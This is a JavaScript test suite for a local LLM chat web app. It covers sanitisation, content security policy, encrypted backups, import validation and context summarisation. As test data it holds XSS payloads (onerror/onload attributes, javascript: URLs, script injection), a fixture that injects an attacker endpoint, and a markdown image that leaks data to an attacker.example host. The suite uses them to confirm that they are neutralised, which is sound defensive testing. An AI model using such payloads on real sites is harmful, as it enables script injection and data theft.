const test = require('node:test');
const assert = require('node:assert/strict');
const acorn = require('acorn');
const { createApp, html, scripts } = require('./app.cjs');
const normalize = value => JSON.parse(JSON.stringify(value));

test('every inline script parses and PDF loads use the safe, version-matched adapter', () => {
  scripts.forEach(script => acorn.parse(script, { ecmaVersion: 'latest' }));
  assert(!html.includes('pdfjsLib.getDocument'));
  assert(html.includes('isEvalSupported: false'));
  assert(html.includes('pdfjs-dist@6.4.299'));
  assert(html.includes('dompurify@3.4.17'));
  assert(!html.includes('user-scalable=no'));
});

test('crafted filenames and progress labels remain inert plain text', async t => {
  const app = createApp(); t.after(app.close); await app.boot();
  app.run('pendingAttachments = [{type:"txt", fileName:"<img src=x onerror=alert(1)>.txt"}]; showMultiAttachmentPreview();');
  const preview = app.document.getElementById('attachmentPreview');
  assert.equal(preview.querySelector('img'), null);
  assert(preview.textContent.includes('<img src=x onerror=alert(1)>.txt'));
  app.run('showPendingAttachmentPreview({type:"pdf",fileName:"<svg onload=alert(1)>.pdf"}); setProcessingLabel(document.getElementById("messageHistory"), "Reading <img onerror=alert(1)>");');
  assert.equal(preview.querySelector('svg'), null);
  assert.equal(app.document.getElementById('messageHistory').querySelector('img'), null);
  assert.equal(app.run('safeExternalUrl("javascript:alert(1)")'), '');
  assert.equal(app.run('safeExternalUrl("https://example.com/source")'), 'https://example.com/source');
});

test('chat model discovery rejects embedding-only models and restores a valid saved choice', async t => {
  const app = createApp(async url => {
    if (String(url).endsWith('/api/tags')) return Response.json({ models: [{ name: 'qwen3-embedding:0.6b' }, { name: 'unknown-encoder', capabilities: ['embedding'] }, { name: 'test-chat' }, { name: 'vision-chat', capabilities: ['completion', 'vision'] }] });
    if (String(url).endsWith('/api/show')) return Response.json({ capabilities: ['completion'] });
    return Response.json({ data: [] });
  });
  t.after(app.close); await app.boot();
  const options = [...app.document.getElementById('modelSelection').options].map(option => option.value);
  assert.deepEqual(options, ['test-chat', 'vision-chat']);
  app.window.localStorage.setItem('defaultModel', 'vision-chat');
  app.document.getElementById('modelSelection').innerHTML = '<option>Loading models...</option>';
  await app.run('fetchModels()');
  assert.equal(app.run('getModelSelection()'), 'vision-chat');
  app.window.localStorage.setItem('defaultModel', 'qwen3-embedding:0.6b');
  await app.run('fetchModels()');
  assert.notEqual(app.run('getModelSelection()'), 'qwen3-embedding:0.6b');
  assert.throws(() => app.run('assertModelSupportsImage("test-chat",{type:"image"})'), /does not support images/);
});

test('cloud cancellation prevents a late response from being saved in another thread', async t => {
  const app = createApp(); t.after(app.close); await app.boot();
  await app.run('setApiKey("perplexityApiKey","synthetic-test-key")');
  app.window.localStorage.setItem('autoTitle', 'false');
  let release, reached;
  const requestStarted = new Promise(resolve => { reached = resolve; });
  let signal;
  app.window.fetch = async (_url, options) => { signal = options.signal; reached(); return new Promise(resolve => { release = resolve; }); };
  app.document.getElementById('perplexitySearchCheckbox').checked = true;
  app.document.getElementById('userInput').value = 'A synthetic prompt in thread 1';
  const request = app.run('sendMessage()');
  await requestStarted;
  app.run('resetComposerForThreadChange(); currentThreadId=2;');
  assert(signal.aborted);
  await request;
  release(Response.json({ choices: [{ message: { content: 'A late reply' } }] }));
  await new Promise(resolve => setTimeout(resolve, 10));
  const snapshot = await app.run('readBackupSnapshot()');
  assert.equal(snapshot.messages.filter(message => message.role === 'assistant').length, 0);
  assert.equal(snapshot.messages[0].threadId, 1);
  assert.equal(app.document.getElementById('sendButton').disabled, false);
});

test('an old request cannot clear or unlock a newer request’s composer', async t => {
  const app = createApp(); t.after(app.close); await app.boot();
  await app.run('setApiKey("perplexityApiKey","synthetic-test-key")');
  let reached;
  const started = new Promise(resolve => { reached = resolve; });
  app.window.fetch = async () => { reached(); return new Promise(() => {}); };
  app.document.getElementById('perplexitySearchCheckbox').checked = true;
  app.document.getElementById('userInput').value = 'First request';
  const first = app.run('sendMessage()');
  await started;
  app.run('resetComposerForThreadChange(); currentThreadId=2; beginForegroundRequest("New request"); pendingAttachment={fileName:"new.txt"};');
  app.document.getElementById('sendButton').disabled = true;
  await first;
  assert.equal(app.document.getElementById('sendButton').disabled, true);
  assert.equal(app.run('pendingAttachment.fileName'), 'new.txt');
  app.run('resetComposerForThreadChange()');
});

test('whole-document synthesis carries findings from all 32 sections through reduction', async t => {
  const app = createApp(); t.after(app.close); await app.boot();
  const batches = [];
  app.window.fetch = async (_url, options) => {
    const prompt = JSON.parse(options.body).messages[0].content;
    batches.push(prompt);
    const markers = [...new Set(prompt.match(/\[D\d+\]/g) || [])];
    return Response.json({ message: { content: markers.map(marker => marker + ' preserved fact').join(' ') } });
  };
  app.run(`mapDocumentChunks=async()=>{
    const document={id:1,name:"Review.txt"};
    const partials=Array.from({length:32},(_,index)=>({workspaceDocument:document,chunk:{lineStart:index*100+1,lineEnd:index*100+100},text:("[D"+(index+1)+"] important evidence ").repeat(80)}));
    partials.analysedSections=32;return partials;
  };`);
  const result = await app.run('prepareDocumentContext([{id:1,name:"Review.txt",chunks:[{text:"x".repeat(90000),lineStart:1,lineEnd:3200}]}], "Review every section", [], "test-chat", document.getElementById("messageHistory"), "whole")');
  assert.equal(result.mode, 'whole-document');
  assert.equal(result.citations.length, 32);
  assert.equal(result.coverage.analysed, 32);
  assert(result.coverage.reductionPasses > 0);
  for (let i = 1; i <= 32; i++) assert(result.block.includes('[D' + i + ']'), 'Missing section ' + i);
  assert(batches.length > 1);
  assert.equal(app.run('getAvailableDocumentTokens([{content:"x".repeat(70000)}])'), 0);
});

test('direct context includes every source; exhausted context fails clearly instead of overflowing', async t => {
  const app=createApp();t.after(app.close);await app.boot();
  const result=await app.run('prepareDocumentContext([{id:1,name:"A.txt",chunks:[{text:"First fact",lineStart:1,lineEnd:1},{text:"Last fact",lineStart:2,lineEnd:2}]}],"Summarise",[],"test-chat",document.getElementById("messageHistory"))');
  assert.equal(result.mode,'direct');assert.equal(result.citations.length,2);assert(result.block.includes('Last fact'));
  await assert.rejects(app.run('prepareDocumentContext([{id:1,name:"A.txt",chunks:[{text:"Fact"}]}],"Question",[{content:"x".repeat(70000)}],"test-chat",document.getElementById("messageHistory"))'),/conversation fills/);
});

test('encrypted backup restores documents, cached embeddings, memories and citation identities', async t => {
  const app=createApp();t.after(app.close);await app.boot();
  await app.run(`(async()=>{
    const payload={name:"Private.pdf",type:"pdf",size:100,fullText:"Confidential document fact",chunks:[{text:"Confidential document fact",page:1,lineStart:1,lineEnd:1}],tokenEstimate:7,embeddingModel:"test",embeddingVersion:1,chunkEmbeddings:["AQID"]};
    const encrypted=await encryptDocumentPayload(payload,1);
    await new Promise((resolve,reject)=>{const tx=db.transaction(["documents","messages"],"readwrite");tx.objectStore("documents").add({id:7,threadId:1,contentHash:"hash",createdAt:1,...encrypted});tx.objectStore("messages").add({threadId:1,role:"assistant",text:"Supported fact [D1]",type:"text",timestamp:2,citations:[{type:"document",documentId:7,location:"page 1",label:"[D1] Private.pdf · page 1"}]});tx.oncomplete=resolve;tx.onabort=()=>reject(tx.error);});
    await saveMemoryCandidate({fact:"Prefers concise answers",key:"user:style"},1,true);
    await setApiKey("perplexityApiKey","SECRET-KEY-MUST-NOT-EXPORT");
  })()`);
  const data=normalize(await app.run('buildWorkspaceBackup()'));
  assert(!JSON.stringify(data).includes('SECRET-KEY-MUST-NOT-EXPORT'));
  app.window.backupFixture=data;
  const encrypted=normalize(await app.run('encryptWorkspaceBackup(backupFixture,"correct horse test passphrase")'));
  assert(!JSON.stringify(encrypted).includes('Confidential'));
  app.window.envelopeFixture=encrypted;
  await assert.rejects(app.run('decryptWorkspaceBackup(envelopeFixture,"wrong password")'),/incorrect or the file is damaged/);
  const decrypted=normalize(await app.run('decryptWorkspaceBackup(envelopeFixture,"correct horse test passphrase")'));
  assert.deepEqual(decrypted,data);
  app.window.restoreFixture=decrypted;
  const counts=normalize(await app.run('restoreBackupData(restoreFixture)'));
  assert.equal(counts.documents,1);assert.equal(counts.memories,1);
  const snapshot=await app.run('readBackupSnapshot()');
  const imported=snapshot.messages.find(message=>message.threadId!==1);
  const document=snapshot.documents.find(record=>record.threadId===imported.threadId);
  assert.equal(imported.citations[0].documentId,document.id);
  assert.notEqual(document.id,7);
  app.window.documentFixture=document;
  const restoredDoc=normalize(await app.run('decryptDocumentRecord(documentFixture)'));
  assert.equal(restoredDoc.fullText,'Confidential document fact');
  assert.deepEqual(restoredDoc.chunkEmbeddings,['AQID']);
  const memories=await app.run('loadAllMemories({includeSuperseded:true})');
  assert(memories.some(memory=>memory.sourceThreadId===imported.threadId&&memory.fact==='Prefers concise answers'));
});

test('legacy chat imports validate references and ignore endpoint or credential injection', async t => {
  const app=createApp();t.after(app.close);await app.boot();
  app.window.legacy={version:'2.0',threads:[{id:10,name:'Legacy',systemPrompt:'Helpful',created:1}],messages:[{threadId:10,role:'user',text:'Old conversation',timestamp:1}],settings:{theme:'dark',ollamaEndpoint:'https://attacker.invalid',perplexityApiKey:'injected',agentSearch:'true'}};
  await app.run('restoreBackupData(legacy)');
  assert.equal(app.window.localStorage.getItem('theme'),'dark');
  assert.equal(app.window.localStorage.getItem('ollamaEndpoint'),null);
  assert.equal(app.window.localStorage.getItem('perplexityApiKey'),null);
  const before=(await app.run('readBackupSnapshot()')).threads.length;
  app.window.invalid={...app.window.legacy,messages:[{threadId:99,role:'user',text:'Bad',timestamp:1}]};
  await assert.rejects(app.run('restoreBackupData(invalid)'),/Invalid backup/);
  assert.equal((await app.run('readBackupSnapshot()')).threads.length,before);
  // A synchronous structured-clone failure must roll back earlier queued writes as well.
  app.window.uncloneable={...app.window.legacy,threads:[{id:10,name:'Good'},{id:11,name:'Bad',created(){}}]};
  await assert.rejects(app.run('restoreBackupData(uncloneable)'));
  await new Promise(resolve=>setTimeout(resolve,5));
  assert.equal((await app.run('readBackupSnapshot()')).threads.length,before);
});

test('saved whole-document responses render their coverage and sources', async t => {
  const app=createApp();t.after(app.close);await app.boot();
  const element=app.run('createMessageElement({id:1,role:"assistant",text:"Answer",type:"text",responseTime:"test · 1s",documentMode:"whole-document",documentCoverage:{analysed:32,total:32},citations:[]})');
  assert(element.textContent.includes('32/32 sections'));
});

test('accessible settings labels preserve API-key status badges and saving existing keys', async t => {
  const app=createApp();t.after(app.close);await app.boot();
  await app.run('setApiKey("perplexityApiKey","synthetic-configured-key")');
  assert.doesNotThrow(()=>app.run('openSettings()'));
  assert(app.document.getElementById('perplexityKeyBadge'));
  assert.equal(app.document.getElementById('perplexityApiKeyInput').value,'••••••••');
  app.run('closeSettings()');
  assert.equal(app.run('getApiKey("perplexityApiKey")'),'synthetic-configured-key');
});

test('very long document lines are split without losing tail facts or line provenance', async t => {
  const app=createApp();t.after(app.close);await app.boot();
  app.window.longLine='Important data '.repeat(3000)+'THE FINAL IMPORTANT FACT';
  const chunks=normalize(app.run('chunkTextWithLines(longLine,2400,0)'));
  assert(chunks.length>10);
  assert(chunks.every(chunk=>chunk.text.length<=2400&&chunk.lineStart===1&&chunk.lineEnd===1));
  assert.equal(chunks.map(chunk=>chunk.text).join(''),app.window.longLine);
  assert(chunks.at(-1).text.includes('THE FINAL IMPORTANT FACT'));
});

// ---- Regression tests for the v2.3.1 defect fixes ----

test('PDF export sanitises message markup and escapes the thread name', async t => {
  const app = createApp(); t.after(app.close); await app.boot();
  app.window.exportFixture = [
    { role: 'assistant', type: 'text', text: 'Fine **text** <img src=x onerror="window.__pwned=1"><script>window.__pwned=2</script><a href="javascript:alert(1)">link</a>', timestamp: 1 },
    { role: 'user', type: 'image', imageData: 'javascript:alert(1)" onerror="window.__pwned=3', timestamp: 2 },
    { role: 'user', type: 'image', imageData: 'data:image/png;base64,iVBORw0KGgo=', timestamp: 3 }
  ];
  const output = app.run('buildThreadPrintHtml("</title><script>window.__pwned=4</script><img src=x onerror=alert(1)>", exportFixture)');
  const { JSDOM } = require('jsdom');
  const printed = new JSDOM(output).window.document;
  assert.equal(printed.querySelectorAll('script').length, 1, 'only the print trigger script may remain');
  assert.equal(printed.querySelector('script').textContent.trim(), 'window.onload = () => { window.print(); }');
  assert.equal(printed.querySelectorAll('[onerror],[onload],[onclick]').length, 0);
  assert(![...printed.querySelectorAll('a')].some(link => /^javascript:/i.test(link.getAttribute('href') || '')));
  assert.equal(printed.querySelectorAll('img[src^="data:image/png"]').length, 1);
  assert(![...printed.querySelectorAll('img')].some(img => /^javascript:/i.test(img.getAttribute('src') || '')));
  assert(printed.querySelector('h1').textContent.includes('</title><script>'));
  assert(printed.querySelector('strong'), 'ordinary Markdown still renders');
});

test('dead code, the no-op isolation tag and the URL-borne Gemini key are gone', () => {
  for (const gone of ['coi-serviceworker', 'pdfPagesPerChunkInput', 'shouldPassAttachmentRaw', 'processAttachmentInChunks', 'callSummarizationAPI', 'generateContent?key=']) assert(!html.includes(gone), gone);
  assert(html.includes('"x-goog-api-key": geminiApiKey'));
});

test('utility calls keep the chat context size so Ollama does not reload the model', async t => {
  const app = createApp(); t.after(app.close); await app.boot();
  for (const context of ['8192', '16384', '32768']) {
    app.run(`setModelContext("${context}")`);
    assert.equal(app.run('getOllamaOptions("utility").num_ctx'), Number(context));
    assert.equal(app.run('getOllamaOptions("utility").num_ctx'), app.run('getOllamaOptions().num_ctx'));
  }
});

test('the conversation summary is cached on the thread and only extended in batches', async t => {
  const app = createApp(); t.after(app.close); await app.boot();
  const calls = [];
  app.window.fetch = async (_url, options) => {
    const body = JSON.parse(options.body);
    calls.push(body);
    return Response.json({ message: { content: '<think>hidden</think>Summary v' + calls.length } });
  };
  const add = (count, start) => app.run(`(async()=>{for(let i=0;i<${count};i++){await saveMessage({role:i%2?"assistant":"user",text:"Message number "+(${start}+i),type:"text",timestamp:${start}+i+1},1);}})()`);
  const build = () => app.run('buildContextWithSummary(1, 10, "System prompt", "test-chat", document.getElementById("messageHistory"))').then(normalize);
  await add(31, 0);
  const first = await build();
  assert.equal(calls.length, 1, 'first build summarises once');
  assert.equal(calls[0].options.num_ctx, app.run('getOllamaOptions().num_ctx'));
  assert(calls[0].messages[0].content.includes('Message number 0') && calls[0].messages[0].content.includes('Message number 19'));
  assert(first[0].content.includes('Summary v1') && !first[0].content.includes('hidden'));
  assert.equal(first.length, 11);
  await add(2, 31);
  const second = await build();
  assert.equal(calls.length, 1, 'two more turns reuse the cached summary');
  assert.equal(second[0].content, first[0].content, 'the prompt prefix is unchanged');
  assert.equal(second.length, 13, 'aged-out turns stay verbatim until the next refresh');
  assert.equal(second[1].content, 'Message number 20');
  await add(6, 33);
  const third = await build();
  assert.equal(calls.length, 2, 'eight aged-out turns trigger one incremental refresh');
  assert(calls[1].messages[0].content.includes('Summary v1'), 'the refresh extends the previous summary');
  assert(!calls[1].messages[0].content.includes('Message number 5\n'), 'already-summarised turns are not re-sent');
  assert(third[0].content.includes('Summary v2'));
  assert.equal(third.length, 11);
  const stored = normalize(await app.run('getThreadRecord(1)'));
  assert.equal(stored.contextSummary.text, 'Summary v2');
  assert.equal(stored.contextSummary.covered.count, 28);
  // Deleting a summarised message invalidates the cache instead of reusing a stale summary.
  await app.run('new Promise(resolve=>{const tx=db.transaction(["messages"],"readwrite");tx.objectStore("messages").delete(3);tx.oncomplete=resolve;})');
  await build();
  assert.equal(calls.length, 3);
  assert(!calls[2].messages[0].content.includes('Summary v2'));
});

test('a long history is folded into the summary in batches rather than truncated', async t => {
  const app = createApp(); t.after(app.close); await app.boot();
  const prompts = [];
  app.window.fetch = async (_url, options) => { prompts.push(JSON.parse(options.body).messages[0].content); return Response.json({ message: { content: 'Summary ' + prompts.length } }); };
  await app.run('(async()=>{for(let i=0;i<40;i++){await saveMessage({role:i%2?"assistant":"user",text:"FACT-"+i+" "+"detail ".repeat(250),type:"text",timestamp:i+1},1);}})()');
  await app.run('buildContextWithSummary(1, 10, "", "test-chat", document.getElementById("messageHistory"))');
  assert(prompts.length > 1);
  assert(prompts.every(prompt => prompt.length < 12000), 'each batch fits the utility prompt budget');
  for (let i = 0; i < 29; i++) assert(prompts.some(prompt => prompt.includes('FACT-' + i + ' ')), 'missing FACT-' + i);
});

test('Regenerate and Answer Now run the full Send pipeline', async t => {
  const app = createApp(); t.after(app.close); await app.boot();
  for (const name of ['autoTitle', 'suggestedFollowUps', 'autoFactCheck', 'learnMemories']) app.window.localStorage.setItem(name, 'false');
  app.window.localStorage.setItem('useMemories', 'true');
  await app.run('saveMemoryCandidate({fact:"The user is called Jim and prefers metric units",key:"user:name"},1,true)');
  const calls = [];
  app.window.fetch = async (url, options) => {
    if (!String(url).endsWith('/api/chat')) return Response.json({ models: [], data: [] });
    calls.push(JSON.parse(options.body));
    return Response.json({ message: { content: '<think>private reasoning</think>Answer ' + calls.length } });
  };
  app.document.getElementById('userInput').value = 'What units should I use, Jim asks?';
  await app.run('sendMessage()');
  assert.equal(calls.length, 1);
  app.document.getElementById('userInput').value = 'an unsent draft';
  let stored = (await app.run('readBackupSnapshot()')).messages;
  await app.run(`deleteMessageAndSubsequent(${stored.find(message => message.role === 'assistant').id})`);
  await app.run('regenerateResponse()');
  assert.equal(calls.length, 2);
  const regenerated = calls[1];
  assert.deepEqual(regenerated.messages.filter(message => message.role === 'user').map(message => message.content), ['What units should I use, Jim asks?']);
  assert(regenerated.messages[0].role === 'system' && regenerated.messages[0].content.includes('prefers metric units'), 'memories are injected on regenerate');
  assert.deepEqual(normalize(regenerated.messages), normalize(calls[0].messages), 'regenerate sends exactly what Send sent');
  stored = (await app.run('readBackupSnapshot()')).messages;
  assert.equal(stored.length, 2);
  const reply = stored.find(message => message.role === 'assistant');
  assert.equal(reply.text, 'Answer 2', 'think tags are stripped before saving');
  assert(reply.responseTime.endsWith('• regenerated'));
  assert.equal(app.document.getElementById('userInput').value, 'an unsent draft', 'a draft survives regeneration');
  assert.equal(app.document.getElementById('sendButton').disabled, false);
  // Answer Now keeps the clarification exchange and adds a direct-answer turn.
  await app.run('forceAnswerNow("What units should I use, Jim asks?", "test-chat", document.querySelector(".assistant-message"))');
  assert.equal(calls.length, 3);
  assert.equal(calls[2].messages.at(-1).content, 'Please answer my original question directly without asking for further clarification: What units should I use, Jim asks?');
  assert.equal(calls[2].messages.at(-2).content, 'Answer 2');
  stored = (await app.run('readBackupSnapshot()')).messages;
  assert.equal(stored.length, 3);
  assert(stored.at(-1).responseTime.endsWith('• direct answer'));
});

test('retrieval indexes small passages so facts in the middle of a section are found', async t => {
  const app = createApp(); t.after(app.close); await app.boot();
  const filler = 'Routine quarterly administrative notes about office supplies and parking. ';
  app.window.sectionA = filler.repeat(40) + 'The okapi enclosure reopens in March after refurbishment. ' + filler.repeat(40);
  app.window.sectionB = filler.repeat(80);
  const passages = normalize(app.run('documentEmbeddingPassages({name:"Zoo.txt"},{text:sectionA})'));
  assert(passages.length >= 6);
  assert(passages.every(passage => passage.length <= 920 && passage.startsWith('Zoo.txt\n')));
  assert(passages.some(passage => passage.includes('okapi enclosure reopens in March')));
  // Synthetic embedder: one axis for the fact, one for everything else.
  app.run(`embedDocumentTexts = async texts => texts.map(text => { const v = new Array(384).fill(0); v[/okapi|giraffe relative/i.test(text) ? 0 : 1] = 1; return v; });
           persistDocumentEmbeddingCache = async () => {};`);
  app.window.docs = [{ id: 1, name: 'Zoo.txt', chunks: [{ text: app.window.sectionB, lineStart: 1, lineEnd: 1 }, { text: app.window.sectionA, lineStart: 2, lineEnd: 2 }, { text: app.window.sectionB + ' more', lineStart: 3, lineEnd: 3 }] }];
  const ranking = await app.run('rankDocumentChunksHybrid(docs, "When does the giraffe relative exhibit open again?", document.getElementById("messageHistory"))');
  assert.equal(ranking.method, 'hybrid');
  assert.equal(ranking.items[0].chunkIndex, 1, 'the section containing the fact ranks first with no shared keywords');
  assert(ranking.items[0].semanticScore > 0.9);
  assert.equal(app.run('docs[0].embeddingVersion'), 2);
  const stored = app.run('docs[0].chunkEmbeddings');
  assert.equal(stored.length, 3);
  assert.equal(app.run('storedPassageVectors(docs[0].chunkEmbeddings[1]).length'), passages.length);
  // A legacy single-vector cache entry is still readable.
  assert.equal(app.run('storedPassageVectors("AQID").length'), 1);
  assert(app.run('cosineStoredEmbeddings("AQID","AQID")') > 0.99);
});

test('the legacy 10240 chunk default is not used as the retrieval section size', async t => {
  const app = createApp(); t.after(app.close); await app.boot();
  assert.equal(app.window.localStorage.getItem('textChunkSize'), '5600');
  assert.equal(app.window.localStorage.getItem('pdfPagesPerChunk'), null);
});

test('capped utility calls skip model thinking, fall back on older servers, and failed summaries back off', async t => {
  const app = createApp(); t.after(app.close); await app.boot();
  const bodies = [];
  let rejectThink = true, emptySummary = false;
  app.window.fetch = async (_url, options) => {
    const body = JSON.parse(options.body); bodies.push(body);
    if (body.think === false && rejectThink) return Response.json({ error: 'invalid think value' }, { status: 400 });
    return Response.json({ message: { content: emptySummary ? '' : 'A summary' } });
  };
  const call = body => app.run(`fetchOllamaChat({method:"POST",headers:{"Content-Type":"application/json"},body:${JSON.stringify(JSON.stringify(body))}}).then(r=>r.json())`);
  const capped = { model: 'test-chat', stream: false, messages: [{ role: 'user', content: 'x' }], options: { num_predict: 100 } };
  assert.equal((await call(capped)).message.content, 'A summary');
  assert.deepEqual(bodies.map(body => body.think), [false, undefined], 'retries without the field after a 400');
  bodies.length = 0; rejectThink = false;
  await call(capped);
  await call({ ...capped, stream: true });
  await call({ ...capped, options: {} });
  await call({ ...capped, tools: [{ type: 'function' }] });
  assert.deepEqual(bodies.map(body => body.think), [false, undefined, undefined, undefined], 'only capped non-streaming calls are changed');
  // A summary that keeps failing is not retried on every send.
  bodies.length = 0; emptySummary = true;
  await app.run('(async()=>{for(let i=0;i<14;i++){await saveMessage({role:i%2?"assistant":"user",text:"Turn "+i,type:"text",timestamp:i+1},1);}})()');
  const build = () => app.run('buildContextWithSummary(1, 4, "", "test-chat", document.getElementById("messageHistory"))').then(normalize);
  const first = await build();
  assert.equal(bodies.length, 1);
  assert.equal(first.length, 12, 'without a summary the most recent aged-out turns stay verbatim');
  await app.run('saveMessage({role:"user",text:"Turn 14",type:"text",timestamp:15},1)');
  await build();
  assert.equal(bodies.length, 1, 'no second attempt on the very next send');
});

// ---- Offline single file, integrity and storage durability (2.4.0) ----

test('the embedded libraries match the pinned packages and no core script comes from a CDN', () => {
  const vendor = require('../tools/vendor.cjs');
  assert.equal(vendor.render(html), html, 'index.html vendored block is out of date. Run: node tools/vendor.cjs');
  for (const name of ['jszip', 'marked', 'dompurify']) {
    const version = require(`../node_modules/${name}/package.json`).version;
    assert(html.includes(`<script data-vendor="${name}@${version}">`), name);
  }
  assert(html.includes('<script data-vendor="highlight.js@11.9.0">'));
  assert.equal([...html.matchAll(/<script[^>]*\ssrc=/g)].length, 0, 'no external script tags remain');
  assert(!/cdnjs\.cloudflare\.com/.test(html));
  assert(!/<link[^>]+font-awesome/i.test(html));
  const head = html.slice(html.indexOf(vendor.BEGIN), html.indexOf(vendor.END));
  // An embedded script must never contain a sequence that ends or escapes its element.
  for (const match of head.matchAll(/<script data-vendor="[^"]+">([\s\S]*?)<\/script>/g)) assert(!/<!--|<\/?script/i.test(match[1]));
  assert.equal([...head.matchAll(/<script data-vendor=/g)].length, 4);
  const pdf = vendor.pdfIntegrity();
  for (const [file, hash] of Object.entries(pdf)) assert(html.includes(`"${file}": "${hash}"`), file);
});

test('every icon class used by the page has an embedded icon', () => {
  const vendor = require('../tools/vendor.cjs');
  const start = html.indexOf(vendor.BEGIN), end = html.indexOf(vendor.END);
  const icons = vendor.usedIcons(html.slice(0, start) + html.slice(end));
  assert(icons.length > 30);
  for (const icon of icons) assert(html.includes(`.fa-${icon.style}.fa-${icon.name}{--fa-icon:url("data:image/svg+xml,`), `${icon.style} ${icon.name}`);
});

test('the content security policy blocks remote images, frames and unlisted script hosts', () => {
  const policy = html.match(/<meta http-equiv="Content-Security-Policy" content="([^"]+)">/)[1];
  const directives = Object.fromEntries(policy.split(';').map(part => part.trim().split(/\s+/)).map(([name, ...values]) => [name, values]));
  assert.deepEqual(directives['default-src'], ["'none'"]);
  assert.deepEqual(directives['img-src'], ["'self'", 'data:', 'blob:']);
  assert.deepEqual(directives['script-src'].filter(value => value.startsWith('http')), ['https://cdn.jsdelivr.net']);
  assert(!directives['script-src'].includes("'unsafe-eval'"));
  for (const name of ['object-src', 'frame-src', 'base-uri', 'form-action']) assert.deepEqual(directives[name], ["'none'"], name);
  assert(html.indexOf('Content-Security-Policy') < html.indexOf('<script'), 'the policy precedes every script');
});

test('rendered remote images become links and links open outside the app', async t => {
  const app = createApp(); t.after(app.close); await app.boot();
  const element = app.run('createMessageElement({id:9,role:"assistant",type:"text",text:"Look ![secret chart](https://attacker.example/x.png?d=PRIVATE) and [a link](https://example.com/page) and ![ok](data:image/png;base64,iVBORw0KGgo=)"})');
  assert.equal(element.querySelectorAll('img[src^="http"]').length, 0);
  assert.equal(element.querySelectorAll('img[src^="data:image/png"]').length, 1);
  const replaced = element.querySelector('a.remote-image-link');
  assert.equal(replaced.getAttribute('href'), 'https://attacker.example/x.png?d=PRIVATE');
  assert.equal(replaced.textContent, '[image: secret chart]');
  for (const link of element.querySelectorAll('a[href]')) {
    assert.equal(link.getAttribute('target'), '_blank');
    assert.equal(link.getAttribute('rel'), 'noopener noreferrer');
  }
});

function withStorage(app, overrides = {}) {
  const state = { persisted: false, grant: false, persistCalls: 0, usage: 5 * 1024 * 1024, quota: 1024 * 1024 * 1024, ...overrides };
  Object.defineProperty(app.window.navigator, 'storage', { configurable: true, value: {
    persisted: async () => state.persisted,
    persist: async () => { state.persistCalls++; if (state.grant) state.persisted = true; return state.persisted; },
    estimate: async () => ({ usage: state.usage, quota: state.quota })
  } });
  return state;
}
const settle = () => new Promise(resolve => setTimeout(resolve, 20));

test('persistent storage is requested after the first write, once, and a refusal is not repeated', async t => {
  const app = createApp(); t.after(app.close); await app.boot();
  const state = withStorage(app);
  await app.run('refreshStorageStatus()');
  assert.equal(state.persistCalls, 0, 'nothing is requested before there is data');
  await app.run('saveMessage({role:"user",text:"Hello",type:"text",timestamp:1},1)');
  await settle();
  assert.equal(state.persistCalls, 1);
  await app.run('saveMessage({role:"assistant",text:"Hi",type:"text",timestamp:2},1)');
  await settle();
  assert.equal(state.persistCalls, 1, 'not asked again in the same session');
  assert(Number(app.window.localStorage.getItem('storagePersistDeclinedAt')) > 0);
  const status = normalize(await app.run('refreshStorageStatus()'));
  assert.equal(status.messages, 2);
  assert.equal(app.document.getElementById('storagePersistenceText').textContent.startsWith('Not protected'), true);
  assert.equal(app.document.getElementById('storagePersistButton').style.display, '');
  assert.equal(app.document.getElementById('storageUsageText').textContent, '5.0 MB of 1.0 GB available (0.5%)');
  assert.equal(app.document.getElementById('storageContentsText').textContent, '1 thread · 2 messages · 0 documents · 0 memories');
  assert.equal(app.document.getElementById('storageBackupText').textContent, 'Never');
  const notice = app.document.getElementById('storageNotice');
  assert.equal(notice.style.display, 'block');
  assert(notice.textContent.includes('never backed up'));
  // A new session inside the retry window stays quiet; the button and an install still work.
  app.run('storagePersistAttempted = false');
  await app.run('requestPersistentStorage()');
  assert.equal(state.persistCalls, 1);
  state.grant = true;
  assert.equal(await app.run('requestPersistentStorage({ retry: true })'), true);
  assert.equal(state.persistCalls, 2);
  assert.equal(app.window.localStorage.getItem('storagePersistDeclinedAt'), null);
  await app.run('refreshStorageStatus()');
  assert(app.document.getElementById('storagePersistenceText').textContent.startsWith('Protected'));
  assert.equal(app.document.getElementById('storagePersistButton').style.display, 'none');
  assert.equal(notice.style.display, 'none');
});

test('storage warnings reflect fullness and the last backup time', async t => {
  const app = createApp(); t.after(app.close); await app.boot();
  const state = withStorage(app, { persisted: true, usage: 800, quota: 1000 });
  let status = normalize(await app.run('refreshStorageStatus()'));
  assert.equal(status.level, 'warning');
  assert.equal(app.document.getElementById('storageNotice').textContent, 'Storage is 80% full.');
  state.usage = 950;
  status = normalize(await app.run('refreshStorageStatus()'));
  assert.equal(status.level, 'danger');
  assert(app.document.getElementById('storageNotice').textContent.includes('may not be saved'));
  assert.equal(app.document.getElementById('storageMeter').getAttribute('aria-valuenow'), '95');
  app.window.localStorage.setItem('lastWorkspaceBackupAt', String(Date.UTC(2026, 0, 2)));
  await app.run('refreshStorageStatus()');
  assert.notEqual(app.document.getElementById('storageBackupText').textContent, 'Never');
  assert.equal(app.run('formatBytes(1536)'), '1.5 KB');
  assert.equal(app.run('formatBytes(0)'), '0 B');
});

test('a browser without the storage API degrades to a plain statement', async t => {
  const app = createApp(); t.after(app.close); await app.boot();
  Object.defineProperty(app.window.navigator, 'storage', { configurable: true, value: undefined });
  await app.run('saveMessage({role:"user",text:"Hello",type:"text",timestamp:1},1)');
  const status = normalize(await app.run('refreshStorageStatus()'));
  assert.equal(status.canPersist, false);
  assert(app.document.getElementById('storagePersistenceText').textContent.includes('cannot protect storage'));
  assert.equal(app.document.getElementById('storageUsageText').textContent, 'Not reported by this browser');
  assert.equal(app.document.getElementById('storagePersistButton').style.display, 'none');
});

test('a failed write is reported instead of being silently dropped', async t => {
  const app = createApp(); t.after(app.close); await app.boot();
  const alerts = [];
  app.window.alert = message => alerts.push(message);
  app.run('alert = window.alert');
  // A record the database cannot store makes the write fail, as a full disk would.
  const id = await app.run('saveMessage({role:"user",text:"x",type:"text",timestamp(){}},1).catch(()=>null)');
  assert.equal(id ?? null, null);
  app.run('reportStorageWriteError(Object.assign(new Error("full"),{name:"QuotaExceededError"}),"message")');
  await settle();
  assert(alerts.some(message => /storage is full/.test(message) || /could not be saved/.test(message)), JSON.stringify(alerts));
});

// ---- Chat encryption, passphrase lock, alerts and model manager (2.5.0) ----

const rawStores = app => app.run('readRawSnapshot()').then(snapshot => ({ threads: snapshot.threads, messages: snapshot.messages }));
